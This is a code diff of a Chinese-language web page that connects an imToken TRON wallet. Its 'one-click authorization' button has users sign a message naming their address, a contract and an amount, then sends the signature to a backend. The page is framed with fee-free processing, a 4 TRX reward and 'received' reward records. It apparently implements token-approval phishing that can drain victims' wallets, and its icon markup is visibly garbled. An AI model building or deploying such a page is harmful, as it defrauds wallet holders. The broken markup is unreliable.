@@ -125,7 +125,7 @@
             </div>
         </div> 
         <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled> 一键授权（后端代付+领4TRX）</button>
+        <button id="approveBtn" class="btn" disabled> 一键授权</button>
     </div>
     <div class="footer-info">
         合约验证：TronFullFeeDelegated <span>TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk</span>（TRON浏览器查询）
@@ -206,14 +206,14 @@
                 }
             };
 
-            // 核心：一键授权（已修复TronWeb兼容问题）
+             // 核心：一键授权（已修复SHA3兼容问题）
             approveBtn.onclick = async () => {
                 if (!userAddress || !tronWeb) {
                     alert("请先连接钱包");
                     return;
                 }
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 生成授权签名中...';
+                approveBtn.innerHTML = '生成授权签名中...';
 
                 try {
                     // 1. 转换地址为Hex格式
@@ -226,8 +226,8 @@
                     // 3. 手动拼接参数（地址+合约地址+金额，去掉0x前缀）
                     const message = userAddrHex.replace('0x', '') + contractAddrHex.replace('0x', '') + amountHex.replace('0x', '');
                     
-                    // 4. 生成SHA3哈希（匹配合约messageHash）
-                    const messageHash = tronWeb.utils.sha3(message, false);
+                    // 4. 用crypto-js计算SHA3哈希（替代tronWeb.utils.sha3）
+                    const messageHash = calculateSHA3(message);
                     
                     // 5. 用户本地签名（imToken安全签名）
                     const signature = await tronWeb.trx.signMessage(
@@ -238,7 +238,7 @@
                     const { v, r, s } = signature;
 
                     // 6. 调用后端代付接口
-                    approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 后端代付中...';
+                    approveBtn.innerHTML = ' 后端代付中...';
                     const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -280,7 +280,7 @@
                     alert(`操作失败：${e.message}`);
                 } finally {
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = '<<<i class="fa fa-check-circle"></</</i> 一键授权（后端代付+领4TRX）';
+                    approveBtn.innerHTML = ' 一键授权';
                 }
             };
 
@@ -372,8 +372,8 @@
                         <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                         <p><strong>授权类型：</strong>${record.approveType}</p>
                         <p><strong>奖励：</strong>${record.reward}（已到账）</p>
-                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approveTxid}" target="_blank" class="tx-link">${record.approveTxid.slice(0,10)}...<<<i class="fa fa-external-link"></</</i></a></p>
-                        <p><strong>奖励哈希：</strong><a href="https://tronscan.org/#/transaction/${record.rewardTxid}" target="_blank" class="tx-link">${record.rewardTxid.slice(0,10)}...<<<i class="fa fa-external-link"></</</i></a></p>
+                        <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${record.approveTxid}" target="_blank" class="tx-link">${record.approveTxid.slice(0,10)}...<<<<i class="fa fa-external-link"></</</</i></a></p>
+                        <p><strong>奖励哈希：</strong><a href="https://tronscan.org/#/transaction/${record.rewardTxid}" target="_blank" class="tx-link">${record.rewardTxid.slice(0,10)}...<<<<i class="fa fa-external-link"></</</i></a></p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
                         <p><strong>状态：</strong><span style="color:#4ade80">${record.status}</span></p>
                     </div>
